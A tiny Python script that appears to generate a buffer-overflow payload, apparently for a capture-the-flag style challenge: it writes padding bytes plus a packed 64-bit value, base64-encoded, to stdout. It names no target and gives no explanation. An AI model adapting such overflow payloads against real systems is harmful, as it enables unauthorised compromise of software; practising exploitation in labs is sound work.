
import sys
import struct
import base64

buf = b'TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT'
buf += struct.pack('<Q', 8711579774435596328)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
